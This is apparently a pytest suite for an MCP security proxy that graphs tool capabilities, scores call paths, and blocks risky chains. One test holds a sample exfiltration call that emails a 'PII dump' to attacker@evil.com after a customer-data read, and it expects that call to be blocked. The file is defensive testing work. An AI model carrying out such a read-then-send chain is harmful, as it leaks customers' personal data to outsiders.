"""Comprehensive tests for Day 3: Capability Risk Graph, Inference, and Path Scoring.

Coverage:
1. Multiple paths per tool
2. Typed-edge compatibility enforcement
3. Sensitive -> External critical path
4. Benign path scoring (echo, calculate)
5. Exact score calculation formula: 0.30*Data + 0.25*Action + 0.20*Exposure + 0.25*Chain / 3 * 100
6. Critical path override independent of weighted score
7. Unknown / unmodeled runtime path fail-safe elevated result
8. Server reload rebuilding graph and removing obsolete capabilities
9. Capability inference never inventing unsupported capabilities
10. Chain risk transition-based security significance
11. Benchmark evaluation across 15 dangerous + 15 benign paths
12. FastAPI capability observability endpoints
"""

import pytest
from httpx import AsyncClient, ASGITransport
import networkx as nx

from mcpath.backend.app import app
from mcpath.evaluation.capability_evaluation import evaluate_capability_weights
from mcpath.graph.capability_inference import CapabilityClassifier, ToolCapability
from mcpath.graph.capability_graph import CapabilityGraph, PathScoringResult
from mcpath.pipeline.pipeline_runner import PipelineRunner
from mcpath.pipeline.stage import PipelineContext
from mcpath.pipeline.stages.stage1_hash import Stage1HashCheck, compute_tool_hash
from mcpath.pipeline.stages.stage2_capability import Stage2CapabilityRisk
from mcpath.proxy.client_manager import DownstreamClientManager, set_active_client_manager
from mcpath.risk_engine.engine import RiskEngine
from mcpath.risk_engine.models import EnforcementDecision, SecurityEventRecord


# ---------------------------------------------------------------------------
# Sample tool manifests for testing
# ---------------------------------------------------------------------------

SAMPLE_TOOLS = {
    "server_a": [
        {
            "name": "echo",
            "description": "Echoes back the provided message.",
            "inputSchema": {"type": "object", "properties": {"message": {"type": "string"}}}
        },
        {
            "name": "calculate",
            "description": "Perform basic arithmetic calculations.",
            "inputSchema": {"type": "object", "properties": {"operation": {"type": "string"}, "a": {"type": "number"}, "b": {"type": "number"}}}
        },
        {
            "name": "read_customer",
            "description": "Read customer profile data containing sensitive PII and SSN.",
            "inputSchema": {"type": "object", "properties": {"customer_id": {"type": "string"}}}
        }
    ],
    "server_b": [
        {
            "name": "send_email",
            "description": "Simulates dispatching an email to an external recipient.",
            "inputSchema": {"type": "object", "properties": {"recipient": {"type": "string"}, "subject": {"type": "string"}, "body": {"type": "string"}}}
        },
        {
            "name": "delete_repository",
            "description": "Permanently deletes a code repository.",
            "inputSchema": {"type": "object", "properties": {"repo_name": {"type": "string"}, "force": {"type": "boolean"}}}
        }
    ]
}


@pytest.fixture
def populated_graph() -> CapabilityGraph:
    """Fixture providing a CapabilityGraph populated with sample multi-server tools."""
    graph = CapabilityGraph()
    graph.rebuild_for_all_servers(SAMPLE_TOOLS)
    return graph


# ---------------------------------------------------------------------------
# Test 1: Inference Never Invents Unsupported Capabilities
# ---------------------------------------------------------------------------

def test_capability_inference_never_invents_unsupported_capabilities():
    """Verify that capability inference never invents sensitive data access or external exposure."""
    classifier = CapabilityClassifier()

    # Generic benign tool with no sensitive keywords
    benign_tool = {
        "name": "format_text",
        "description": "Indents and formats markdown text.",
        "inputSchema": {"type": "object", "properties": {"text": {"type": "string"}, "spaces": {"type": "integer"}}}
    }
    cap = classifier.classify_tool("custom_server", benign_tool)
    assert cap.data_sensitivity == 0.0, "Benign tool must not have invented data sensitivity"
    assert cap.external_exposure == 0.0, "Benign tool must not have invented external exposure"
    assert cap.external_destination is None, "Benign tool must not have invented destination"
    assert cap.action_sensitivity <= 1.0

    # Tool with customer data keyword
    customer_tool = {
        "name": "lookup_user",
        "description": "Lookup customer account information",
        "inputSchema": {"type": "object", "properties": {"user_id": {"type": "string"}}}
    }
    cap_cust = classifier.classify_tool("custom_server", customer_tool)
    assert cap_cust.data_sensitivity >= 2.0, "Customer data keyword must infer sensitive data access"
    assert cap_cust.external_exposure == 0.0, "Internal user lookup must not have invented external exposure"


# ---------------------------------------------------------------------------
# Test 2: Multiple Paths Per Tool
# ---------------------------------------------------------------------------

def test_multiple_paths_per_tool(populated_graph: CapabilityGraph):
    """Verify a tool can participate in multiple distinct valid causal paths."""
    # read_customer can flow to:
    # 1. read_customer's internal action
    # 2. send_email's external action (since send_email consumes customer_pii)
    paths = populated_graph.get_paths_for_tool("read_customer")
    assert len(paths) >= 2, f"Expected multiple paths for read_customer, got {len(paths)}"

    action_types = [p.path_nodes[-1] if not p.external_exposure else p.path_nodes[-2] for p in paths]
    assert any("read_pii" in str(act) for act in action_types)
    assert any("external_communication" in str(act) or "send_email" in str(act) for act in action_types)


# ---------------------------------------------------------------------------
# Test 3: Typed-Edge Compatibility Enforcement
# ---------------------------------------------------------------------------

def test_typed_edge_compatibility(populated_graph: CapabilityGraph):
    """Verify that only strictly compatible typed edges connect nodes (no arbitrary combinations)."""
    # Allowed edges:
    # Agent -> Tool (CAN_CALL)
    # Tool -> Data/Resource (READS, WRITES)
    # Data/Resource -> Action (FLOWS_TO)
    # Action -> External Destination (SENDS_TO)

    for u, v, d in populated_graph.graph.edges(data=True):
        rel = d.get("relation")
        u_type = populated_graph.graph.nodes[u].get("type")
        v_type = populated_graph.graph.nodes[v].get("type")

        if u_type == "Agent":
            assert v_type == "Tool" and rel == "CAN_CALL"
        elif u_type == "Tool":
            assert v_type == "Data/Resource" and rel in ("READS", "WRITES")
        elif u_type == "Data/Resource":
            assert v_type == "Action" and rel == "FLOWS_TO"
        elif u_type == "Action":
            assert v_type == "External Destination" and rel == "SENDS_TO"

    # Verify no arbitrary direct edges from Tool to External Destination
    for n, d in populated_graph.graph.nodes(data=True):
        if d.get("type") == "Tool":
            for succ in populated_graph.graph.successors(n):
                assert populated_graph.graph.nodes[succ]["type"] == "Data/Resource"


# ---------------------------------------------------------------------------
# Test 4: Benign Path Scoring
# ---------------------------------------------------------------------------

def test_benign_path_scoring(populated_graph: CapabilityGraph):
    """Verify benign tools (echo, calculate) have low scores (<30) and LOW classification."""
    echo_eval = populated_graph.evaluate_runtime_call("echo")
    assert echo_eval.path_risk_score < 30.0
    assert echo_eval.classification == "LOW"
    assert echo_eval.data_sensitivity == 0.0
    assert echo_eval.external_exposure == 0.0

    calc_eval = populated_graph.evaluate_runtime_call("calculate")
    assert calc_eval.path_risk_score < 30.0
    assert calc_eval.classification == "LOW"


# ---------------------------------------------------------------------------
# Test 5: Exact Score Calculation Formula
# ---------------------------------------------------------------------------

def test_score_calculation_formula():
    """Verify Path Risk = 0.30*Data + 0.25*Action + 0.20*Exposure + 0.25*Chain / 3 * 100."""
    graph = CapabilityGraph()
    # Construct a synthetic path with known values:
    # Data Sens = 2.0, Action Sens = 1.0, Exposure = 0.0, Chain Risk = 1.0
    # Weighted sum = 0.30*2.0 + 0.25*1.0 + 0.20*0.0 + 0.25*1.0 = 0.60 + 0.25 + 0.25 = 1.10
    # Score = (1.10 / 3.0) * 100 = 36.67
    graph.graph.add_node("Agent", type="Agent")
    graph.graph.add_node("Tool:test_tool", type="Tool", server="s1")
    graph.graph.add_node("Resource:r1", type="Data/Resource", data_sensitivity=2.0, server="s1")
    graph.graph.add_node("Action:test_tool:read", type="Action", action_sensitivity=1.0, action_type="read", server="s1")
    graph.graph.add_edge("Agent", "Tool:test_tool", relation="CAN_CALL")
    graph.graph.add_edge("Tool:test_tool", "Resource:r1", relation="READS")
    graph.graph.add_edge("Resource:r1", "Action:test_tool:read", relation="FLOWS_TO")

    scored = graph.score_path(["Agent", "Tool:test_tool", "Resource:r1", "Action:test_tool:read"])
    expected_score = round(((0.30 * 2.0 + 0.25 * 1.0 + 0.20 * 0.0 + 0.25 * scored.chain_risk) / 3.0) * 100.0, 2)
    assert abs(scored.path_risk_score - expected_score) < 0.1
    assert scored.data_sensitivity == 2.0
    assert scored.action_sensitivity == 1.0
    assert scored.external_exposure == 0.0


# ---------------------------------------------------------------------------
# Test 6: Critical Path Override (Independent of Weighted Score)
# ---------------------------------------------------------------------------

def test_critical_path_override(populated_graph: CapabilityGraph):
    """Verify Sensitive Data -> External Action -> Destination triggers HIGH override."""
    # Multi-step call sequence: read_customer followed by send_email
    call_seq = ["read_customer", "send_email"]
    eval_res = populated_graph.evaluate_runtime_call("send_email", call_history=call_seq)

    assert eval_res.is_critical_override is True
    assert eval_res.classification == "HIGH"
    assert eval_res.path_risk_score >= 85.0
    assert "CRITICAL PATH OVERRIDE" in eval_res.explanation
    assert eval_res.data_sensitivity >= 2.0
    assert eval_res.external_exposure >= 3.0


# ---------------------------------------------------------------------------
# Test 7: Chain Risk Based on Transition Security Significance
# ---------------------------------------------------------------------------

def test_chain_risk_transition_significance():
    """Verify chain risk is based on security significance of compatible transitions, not raw length."""
    graph = CapabilityGraph()

    # Path A: 4 nodes, sensitive data -> external action
    graph.graph.add_node("Agent", type="Agent")
    graph.graph.add_node("Tool:t1", type="Tool", server="s1")
    graph.graph.add_node("Resource:pii", type="Data/Resource", data_sensitivity=3.0, server="s1")
    graph.graph.add_node("Action:t2:external_send", type="Action", action_sensitivity=3.0, action_type="external_communication", server="s2")
    graph.graph.add_node("Destination:email", type="External Destination", external_exposure=3.0, server="s2")
    graph.graph.add_edge("Agent", "Tool:t1", relation="CAN_CALL")
    graph.graph.add_edge("Tool:t1", "Resource:pii", relation="READS")
    graph.graph.add_edge("Resource:pii", "Action:t2:external_send", relation="FLOWS_TO")
    graph.graph.add_edge("Action:t2:external_send", "Destination:email", relation="SENDS_TO")

    chain_risk_hazardous = graph.calculate_chain_risk(["Agent", "Tool:t1", "Resource:pii", "Action:t2:external_send", "Destination:email"])

    # Path B: Same length (5 nodes), but entirely benign internal compute
    graph.graph.add_node("Tool:calc", type="Tool", server="s1")
    graph.graph.add_node("Resource:nums", type="Data/Resource", data_sensitivity=0.0, server="s1")
    graph.graph.add_node("Action:calc:add", type="Action", action_sensitivity=0.0, action_type="benign_compute", server="s1")
    graph.graph.add_edge("Agent", "Tool:calc", relation="CAN_CALL")
    graph.graph.add_edge("Tool:calc", "Resource:nums", relation="READS")
    graph.graph.add_edge("Resource:nums", "Action:calc:add", relation="FLOWS_TO")

    chain_risk_benign = graph.calculate_chain_risk(["Agent", "Tool:calc", "Resource:nums", "Action:calc:add"])

    assert chain_risk_hazardous > chain_risk_benign, "Hazardous transition must produce higher chain risk than benign"
    assert chain_risk_hazardous >= 2.5


# ---------------------------------------------------------------------------
# Test 8: Unknown / Unmodeled Runtime Path Fail-Safe
# ---------------------------------------------------------------------------

def test_unknown_runtime_path_elevated(populated_graph: CapabilityGraph):
    """Verify unknown/unmodeled tools produce elevated score and CAPABILITY PATH: UNKNOWN / UNMODELED."""
    eval_res = populated_graph.evaluate_runtime_call("totally_unmodeled_novel_tool")

    assert "CAPABILITY PATH: UNKNOWN / UNMODELED" in eval_res.explanation
    assert eval_res.classification == "HIGH"
    assert eval_res.path_risk_score >= 70.0  # Elevated score, never treated as safe
    assert eval_res.path_risk_score == 75.0


# ---------------------------------------------------------------------------
# Test 9: Dynamic Server Reload Rebuilding Graph
# ---------------------------------------------------------------------------

def test_server_reload_rebuilding_graph(populated_graph: CapabilityGraph):
    """Verify dynamic reload reclassifies tools, updates graph, and removes obsolete capabilities."""
    assert populated_graph.graph.has_node("Tool:delete_repository")
    assert "delete_repository" in populated_graph.tool_capabilities

    # Simulate dynamic reload where server_b is removed and server_c is added
    updated_server_tools = {
        "server_a": SAMPLE_TOOLS["server_a"],
        "server_c": [
            {
                "name": "http_request",
                "description": "Send outbound HTTP request.",
                "inputSchema": {"type": "object", "properties": {"url": {"type": "string"}}}
            }
        ]
    }

    populated_graph.rebuild_for_all_servers(updated_server_tools)

    # Obsolete capabilities from server_b removed
    assert not populated_graph.graph.has_node("Tool:delete_repository")
    assert "delete_repository" not in populated_graph.tool_capabilities
    assert not populated_graph.graph.has_node("Tool:send_email")

    # Newly added tool present
    assert populated_graph.graph.has_node("Tool:http_request")
    assert "http_request" in populated_graph.tool_capabilities


# ---------------------------------------------------------------------------
# Test 10: Capability-Weight Empirical Evaluation Benchmark
# ---------------------------------------------------------------------------

def test_capability_weight_evaluation_benchmark():
    """Verify empirical evaluation across 15 dangerous + 15 benign ground truth paths."""
    report, summary = evaluate_capability_weights()

    assert summary["dataset_size"] == 30
    assert summary["total_dangerous"] == 15
    assert summary["total_benign"] == 15

    # Check metrics are valid floats
    assert isinstance(report.precision, float)
    assert isinstance(report.recall, float)
    assert isinstance(report.f1_score, float)
    assert isinstance(report.false_positive_rate, float)
    assert isinstance(report.false_negative_rate, float)

    # Benchmark reporting expectations: policy-v1 baseline evaluated
    assert "policy-v1 baseline" in summary["policy_status"]
    assert report.precision >= 0.90, f"Expected Precision >= 0.90, got {report.precision}"
    assert report.recall >= 0.60, f"Expected Recall >= 0.60, got {report.recall}"
    assert report.f1_score >= 0.75, f"Expected F1 >= 0.75, got {report.f1_score}"
    assert report.false_positive_rate <= 0.05, f"Expected FPR <= 0.05, got {report.false_positive_rate}"


# ---------------------------------------------------------------------------
# Test 11: Stage 2 Pipeline Integration & Risk Engine Enforcement
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_stage2_capability_pipeline_integration(populated_graph: CapabilityGraph):
    """Verify Stage2CapabilityRisk integrates into PipelineRunner and produces scores for RiskEngine."""
    stage2 = Stage2CapabilityRisk(graph=populated_graph)
    risk_engine = RiskEngine()

    async def mock_hash_provider(server_name, tool_name):
        return compute_tool_hash({"name": tool_name})

    stage1 = Stage1HashCheck(hash_provider=mock_hash_provider)
    runner = PipelineRunner(stage1=stage1, stage2=stage2, risk_engine=risk_engine, persist_events=False)

    # 1. Benign tool call: echo -> should ALLOW
    event_echo = SecurityEventRecord(
        timestamp="2026-09-23T12:00:00Z",
        server_name="server_a",
        tool_name="echo",
        arguments={"message": "hello"}
    )
    ctx_echo = PipelineContext(
        server_name="server_a",
        tool_name="echo",
        arguments={"message": "hello"},
        tool_definition={"name": "echo"},
        event_record=event_echo
    )
    eval_echo = await runner.run_pre_call(ctx_echo)
    assert eval_echo.decision == EnforcementDecision.ALLOW
    assert eval_echo.scores.capability_risk < 30.0

    # 2. Exfiltration chain: send_email following read_customer -> should BLOCK
    event_exfil = SecurityEventRecord(
        timestamp="2026-09-23T12:01:00Z",
        server_name="server_b",
        tool_name="send_email",
        arguments={"recipient": "attacker@evil.com", "body": "PII dump"}
    )
    ctx_exfil = PipelineContext(
        server_name="server_b",
        tool_name="send_email",
        arguments={"recipient": "attacker@evil.com", "body": "PII dump"},
        tool_definition={"name": "send_email"},
        call_history=["read_customer", "send_email"],
        event_record=event_exfil
    )
    eval_exfil = await runner.run_pre_call(ctx_exfil)
    assert eval_exfil.decision == EnforcementDecision.BLOCK
    assert eval_exfil.scores.capability_risk >= 70.0


# ---------------------------------------------------------------------------
# Test 12: FastAPI Capabilities Observability Endpoints
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_capabilities_api_endpoints(populated_graph: CapabilityGraph):
    """Verify /api/capabilities/graph, /paths, /policy, /tools return correct structures."""
    mgr = DownstreamClientManager()
    mgr.capability_graph = populated_graph
    set_active_client_manager(mgr)
    try:
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            # 1. /api/capabilities/policy
            pol_resp = await client.get("/api/capabilities/policy")
            assert pol_resp.status_code == 200
            pol_json = pol_resp.json()
            assert "policy_version" in pol_json
            assert "weights" in pol_json

            # 2. /api/capabilities/graph
            graph_resp = await client.get("/api/capabilities/graph")
            assert graph_resp.status_code == 200
            g_json = graph_resp.json()
            assert "nodes" in g_json
            assert "edges" in g_json
            assert g_json["total_nodes"] > 0

            # 3. /api/capabilities/paths
            paths_resp = await client.get("/api/capabilities/paths")
            assert paths_resp.status_code == 200
            assert isinstance(paths_resp.json(), list)

            # 4. /api/capabilities/tools
            tools_resp = await client.get("/api/capabilities/tools")
            assert tools_resp.status_code == 200
            assert isinstance(tools_resp.json(), list)
            assert len(tools_resp.json()) > 0
    finally:
        set_active_client_manager(None)


# ---------------------------------------------------------------------------
# Test 13: Canonical Tool Nodes (One Tool Node + One CAN_CALL Edge)
# ---------------------------------------------------------------------------

def test_canonical_tool_nodes_deduplication(populated_graph: CapabilityGraph):
    """Verify each discovered tool produces exactly ONE Tool node (Tool:{name}) and one CAN_CALL edge."""
    # In SAMPLE_TOOLS, there are 3 tools in server_a and 2 tools in server_b = 5 total tools
    total_discovered_tools = sum(len(tools) for tools in SAMPLE_TOOLS.values())
    assert total_discovered_tools == 5

    # 1. Total Tool nodes in graph must equal total discovered tools
    tool_nodes = [n for n, d in populated_graph.graph.nodes(data=True) if d.get("type") == "Tool"]
    assert len(tool_nodes) == total_discovered_tools, f"Expected {total_discovered_tools} Tool nodes, got {len(tool_nodes)}"

    # 2. Every tool node must follow the canonical ID format Tool:{tool_name}
    for n in tool_nodes:
        assert n.startswith("Tool:"), f"Tool node {n} does not use canonical Tool: prefix"
        # Verify no bare duplicate node exists
        bare_name = n.split("Tool:", 1)[1]
        assert not populated_graph.graph.has_node(bare_name), f"Duplicate bare tool node '{bare_name}' found in graph"

    # 3. Exactly one CAN_CALL edge from Agent to each Tool node
    agent_out_edges = list(populated_graph.graph.out_edges("Agent", data=True))
    assert len(agent_out_edges) == total_discovered_tools, f"Expected {total_discovered_tools} CAN_CALL edges from Agent, got {len(agent_out_edges)}"
    for u, v, d in agent_out_edges:
        assert u == "Agent"
        assert v.startswith("Tool:")
        assert d.get("relation") == "CAN_CALL"


# ---------------------------------------------------------------------------
# Test 14: Strict FLOWS_TO & Cross-Server Isolation
# ---------------------------------------------------------------------------

def test_no_arbitrary_cross_server_flows_to_edges():
    """Verify no arbitrary Data/Resource -> Action FLOWS_TO edges connect unrelated tools across servers."""
    multi_server_tools = {
        "filesystem": [
            {
                "name": "read_file",
                "description": "Read file contents from local filesystem.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}}
            },
            {
                "name": "write_file",
                "description": "Write data to local file.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}}
            }
        ],
        "postgres": [
            {
                "name": "list_databases",
                "description": "List all databases on PostgreSQL server.",
                "inputSchema": {"type": "object", "properties": {}}
            },
            {
                "name": "query_records",
                "description": "Execute read query on database.",
                "inputSchema": {"type": "object", "properties": {"sql": {"type": "string"}}}
            }
        ],
        "git": [
            {
                "name": "git_status",
                "description": "Get status of working tree.",
                "inputSchema": {"type": "object", "properties": {}}
            },
            {
                "name": "git_commit",
                "description": "Record changes to the repository.",
                "inputSchema": {"type": "object", "properties": {"message": {"type": "string"}}}
            }
        ]
    }
    graph = CapabilityGraph()
    graph.rebuild_for_all_servers(multi_server_tools)

    # Verify no arbitrary filesystem -> postgres / git FLOWS_TO edges exist
    fs_resource = "Resource:filesystem_data"
    pg_resource = "Resource:database_records"
    git_resource = "Resource:git_repository"

    assert graph.graph.has_node(fs_resource)
    assert graph.graph.has_node(pg_resource)
    assert graph.graph.has_node(git_resource)

    # Check successors of fs_resource: must only flow to filesystem actions
    for succ in graph.graph.successors(fs_resource):
        edge_data = graph.graph.get_edge_data(fs_resource, succ)
        if edge_data.get("relation") == "FLOWS_TO":
            succ_node = graph.graph.nodes[succ]
            assert succ_node.get("server") == "filesystem", f"Unrelated cross-server FLOWS_TO edge found: {fs_resource} -> {succ}"

    # Check successors of pg_resource: must only flow to postgres actions
    for succ in graph.graph.successors(pg_resource):
        edge_data = graph.graph.get_edge_data(pg_resource, succ)
        if edge_data.get("relation") == "FLOWS_TO":
            succ_node = graph.graph.nodes[succ]
            assert succ_node.get("server") == "postgres", f"Unrelated cross-server FLOWS_TO edge found: {pg_resource} -> {succ}"

    # Check successors of git_resource: must only flow to git actions
    for succ in graph.graph.successors(git_resource):
        edge_data = graph.graph.get_edge_data(git_resource, succ)
        if edge_data.get("relation") == "FLOWS_TO":
            succ_node = graph.graph.nodes[succ]
            assert succ_node.get("server") == "git", f"Unrelated cross-server FLOWS_TO edge found: {git_resource} -> {succ}"


# ---------------------------------------------------------------------------
# Test 15: Absence of Unsupported Data-Flow Paths
# ---------------------------------------------------------------------------

def test_unsupported_data_flow_paths_absent(populated_graph: CapabilityGraph):
    """Verify that unsupported cross-server paths (e.g. read_customer -> delete_repository, calculate -> send_email) are NOT generated."""
    # 1. read_customer -> customer_pii -> delete_repository: MUST NOT EXIST
    cust_paths = populated_graph.get_paths_for_tool("read_customer")
    for p in cust_paths:
        assert not any("delete_repository" in n for n in p.path_nodes), (
            f"Invalid path generated: read_customer flows to delete_repository: {p.path_nodes}"
        )

    # 2. calculate -> numeric_operands -> send_email: MUST NOT EXIST
    calc_paths = populated_graph.get_paths_for_tool("calculate")
    for p in calc_paths:
        assert not any("send_email" in n for n in p.path_nodes), (
            f"Invalid path generated: calculate flows to send_email: {p.path_nodes}"
        )
        assert not any("external" in n for n in p.path_nodes), (
            f"Invalid path generated: calculate flows to external destination: {p.path_nodes}"
        )

    # 3. echo -> user_echo_buffer -> send_email: MUST NOT EXIST
    echo_paths = populated_graph.get_paths_for_tool("echo")
    for p in echo_paths:
        assert not any("send_email" in n for n in p.path_nodes), (
            f"Invalid path generated: echo flows to send_email: {p.path_nodes}"
        )


# ---------------------------------------------------------------------------
# Test 16: Preservation of Valid Exfiltration and Benign Paths
# ---------------------------------------------------------------------------

def test_valid_exfiltration_and_benign_paths_preserved(populated_graph: CapabilityGraph):
    """Verify valid exfiltration chain (read_customer -> customer_pii -> send_email -> external) and benign paths (echo, calculate) work."""
    # 1. Benign echo path
    echo_paths = populated_graph.get_paths_for_tool("echo")
    assert len(echo_paths) == 1
    assert echo_paths[0].path_nodes == ["Agent", "Tool:echo", "Resource:user_echo_buffer", "Action:echo:echo_internal"]
    assert echo_paths[0].path_risk_score < 30.0
    assert echo_paths[0].classification == "LOW"

    # 2. Benign calculate path
    calc_paths = populated_graph.get_paths_for_tool("calculate")
    assert len(calc_paths) == 1
    assert calc_paths[0].path_nodes == ["Agent", "Tool:calculate", "Resource:numeric_operands", "Action:calculate:arithmetic_compute"]
    assert calc_paths[0].path_risk_score < 30.0
    assert calc_paths[0].classification == "LOW"

    # 3. Valid cross-server exfiltration path: read_customer -> send_email
    # send_email explicitly declares consumed_data_types: ["customer_pii", ...] in explicit_tool_rules
    cust_paths = populated_graph.get_paths_for_tool("read_customer")
    exfil_path = next(
        (p for p in cust_paths if any("send_email" in n for n in p.path_nodes) and any("external_recipient" in n for n in p.path_nodes)),
        None
    )
    assert exfil_path is not None, "Valid cross-server exfiltration path (read_customer -> send_email) must exist when explicit rule proves compatibility"
    assert exfil_path.is_critical_override is True
    assert exfil_path.classification == "HIGH"
    assert exfil_path.path_risk_score >= 85.0


# ---------------------------------------------------------------------------
# Test 17: External Exposure Not Inferred From Generic Keywords
# ---------------------------------------------------------------------------

def test_external_exposure_not_inferred_from_generic_keywords():
    """Verify that generic keywords like fetch, message, commit, url do not infer external exposure for local tools."""
    classifier = CapabilityClassifier()

    # Tool with "fetch" and "url" on local postgres server
    pg_tool = {
        "name": "fetch_schema_context",
        "description": "Fetch schema metadata and tables using connection url.",
        "inputSchema": {"type": "object", "properties": {"connection_url": {"type": "string"}}}
    }
    cap_pg = classifier.classify_tool("postgres-mcp", pg_tool)
    assert cap_pg.external_exposure == 0.0, "Local postgres tool must not have external exposure from 'fetch' or 'url'"
    assert cap_pg.external_destination is None

    # Tool with "message" and "commit" on local git server
    git_tool = {
        "name": "git_commit",
        "description": "Record changes with a commit message.",
        "inputSchema": {"type": "object", "properties": {"message": {"type": "string"}}}
    }
    cap_git = classifier.classify_tool("git", git_tool)
    assert cap_git.external_exposure == 0.0, "Local git tool must not have external exposure from 'message' or 'commit'"
    assert cap_git.external_destination is None

    # Tool with "creation" in description on filesystem server
    fs_tool = {
        "name": "list_directory",
        "description": "List files in a directory and include the file creation dates.",
        "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}}
    }
    cap_fs = classifier.classify_tool("filesystem", fs_tool)
    assert cap_fs.operation == "READ", "list_directory with 'creation dates' in description must be classified as READ, not WRITE"
    assert cap_fs.external_exposure == 0.0


# ---------------------------------------------------------------------------
# Test 18: Audited Tool Classifications Regression (READ/WRITE & Sensitivity)
# ---------------------------------------------------------------------------

def test_audited_tool_classifications_regression():
    """Verify audited classifications for edit_file, move_file, git_add, git_reset, git_checkout,

    read_text_file, and postgres_mcp_query according to manifest evidence.
    """
    classifier = CapabilityClassifier()

    # 1. read_text_file must be READ, read_filesystem, action_sensitivity=1.0, NOT arbitrary_execution
    rtf_tool = {
        "name": "read_text_file",
        "description": "Read the complete contents of a file from the file system as text. Handles various text encodings.",
        "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}}
    }
    cap_rtf = classifier.classify_tool("filesystem", rtf_tool)
    assert cap_rtf.operation == "READ", "read_text_file must be READ"
    assert cap_rtf.action_type == "read_filesystem", f"Expected read_filesystem, got {cap_rtf.action_type}"
    assert cap_rtf.action_sensitivity == 1.0, "read_text_file must have action_sensitivity=1.0"
    assert cap_rtf.data_target == "filesystem_data"
    assert cap_rtf.external_exposure == 0.0

    # 2. edit_file must be WRITE, write_filesystem, action_sensitivity=2.0
    edit_tool = {
        "name": "edit_file",
        "description": "Make line-based edits to a text file. Each edit replaces exact line sequences with new content.",
        "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}, "edits": {"type": "array"}}}
    }
    cap_edit = classifier.classify_tool("filesystem", edit_tool)
    assert cap_edit.operation == "WRITE", "edit_file modifies file contents and must be WRITE"
    assert cap_edit.action_sensitivity == 2.0, "edit_file must have action_sensitivity=2.0 (appropriate write level)"
    assert cap_edit.action_type == "write_filesystem"
    assert cap_edit.external_exposure == 0.0

    # 3. move_file must be WRITE, write_filesystem, action_sensitivity=2.0
    move_tool = {
        "name": "move_file",
        "description": "Move or rename files and directories. Can move files between directories.",
        "inputSchema": {"type": "object", "properties": {"source": {"type": "string"}, "destination": {"type": "string"}}}
    }
    cap_move = classifier.classify_tool("filesystem", move_tool)
    assert cap_move.operation == "WRITE", "move_file modifies file system paths and must be WRITE"
    assert cap_move.action_sensitivity == 2.0, "move_file must have action_sensitivity=2.0"
    assert cap_move.action_type == "write_filesystem"
    assert cap_move.external_exposure == 0.0

    # 4. git_add must be WRITE, git_stage, action_sensitivity=1.5
    add_tool = {
        "name": "git_add",
        "description": "Adds file contents to the staging area",
        "inputSchema": {"type": "object", "properties": {"repo_path": {"type": "string"}, "files": {"type": "array"}}}
    }
    cap_add = classifier.classify_tool("git", add_tool)
    assert cap_add.operation == "WRITE", "git_add modifies git staging index and must be WRITE"
    assert cap_add.action_sensitivity == 1.5, "git_add must have appropriate write level sensitivity 1.5"
    assert cap_add.data_target == "git_repository"
    assert cap_add.external_exposure == 0.0

    # 5. git_reset must be WRITE, git_reset, action_sensitivity=1.5
    reset_tool = {
        "name": "git_reset",
        "description": "Unstages all staged changes",
        "inputSchema": {"type": "object", "properties": {"repo_path": {"type": "string"}}}
    }
    cap_reset = classifier.classify_tool("git", reset_tool)
    assert cap_reset.operation == "WRITE", "git_reset modifies git staging index and must be WRITE"
    assert cap_reset.action_sensitivity == 1.5
    assert cap_reset.data_target == "git_repository"
    assert cap_reset.external_exposure == 0.0

    # 6. git_checkout must be WRITE, git_checkout, action_sensitivity=1.5
    checkout_tool = {
        "name": "git_checkout",
        "description": "Switches branches",
        "inputSchema": {"type": "object", "properties": {"repo_path": {"type": "string"}, "branch_name": {"type": "string"}}}
    }
    cap_checkout = classifier.classify_tool("git", checkout_tool)
    assert cap_checkout.operation == "WRITE", "git_checkout modifies working directory and HEAD and must be WRITE"
    assert cap_checkout.action_sensitivity == 1.5
    assert cap_checkout.data_target == "git_repository"
    assert cap_checkout.external_exposure == 0.0

    # 7. git_create_branch must be WRITE, git_branch, action_sensitivity=1.5
    branch_tool = {
        "name": "git_create_branch",
        "description": "Creates a new branch from an optional base branch",
        "inputSchema": {"type": "object", "properties": {"repo_path": {"type": "string"}, "branch_name": {"type": "string"}}}
    }
    cap_branch = classifier.classify_tool("git", branch_tool)
    assert cap_branch.operation == "WRITE", "git_create_branch creates new branch ref and must be WRITE"
    assert cap_branch.action_sensitivity == 1.5
    assert cap_branch.data_target == "git_repository"
    assert cap_branch.external_exposure == 0.0

    # 8. git_commit must be WRITE, git_commit, action_sensitivity=1.5, external_exposure=0.0
    commit_tool = {
        "name": "git_commit",
        "description": "Records changes to the repository",
        "inputSchema": {"type": "object", "properties": {"repo_path": {"type": "string"}, "message": {"type": "string"}}}
    }
    cap_commit = classifier.classify_tool("git", commit_tool)
    assert cap_commit.operation == "WRITE", "git_commit must be WRITE"
    assert cap_commit.action_sensitivity == 1.5, "git_commit should have appropriate write level (1.5), not HIGH"
    assert cap_commit.external_exposure == 0.0, "git_commit must have external_exposure=0.0"

    # 9. postgres_mcp_query accepts arbitrary SQL; represented conservatively as WRITE
    pg_query_tool = {
        "name": "postgres_mcp_query",
        "description": "Run a formatted SQL query against a database. Executes a single statement.",
        "inputSchema": {"type": "object", "properties": {"connectionId": {"type": "string"}, "query": {"type": "string"}}}
    }
    cap_query = classifier.classify_tool("postgres-mcp", pg_query_tool)
    assert cap_query.operation == "WRITE", "postgres_mcp_query accepts unconstrained SQL strings and must be represented conservatively as WRITE"
    assert cap_query.action_sensitivity == 2.0
    assert cap_query.data_target == "database_records"
    assert cap_query.data_sensitivity == 2.0
    assert cap_query.external_exposure == 0.0

    # 10. postgres_mcp_modify must be WRITE with sensitivity 2.5
    pg_modify_tool = {
        "name": "postgres_mcp_modify",
        "description": "Modify the database and/or schema by executing SQL statements including DDL (CREATE, ALTER, DROP) and DML (INSERT, UPDATE, DELETE).",
        "inputSchema": {"type": "object", "properties": {"connectionId": {"type": "string"}, "statement": {"type": "string"}}}
    }
    cap_modify = classifier.classify_tool("postgres-mcp", pg_modify_tool)
    assert cap_modify.operation == "WRITE", "postgres_mcp_modify executes DDL/DML and must be WRITE"
    assert cap_modify.action_sensitivity == 2.5
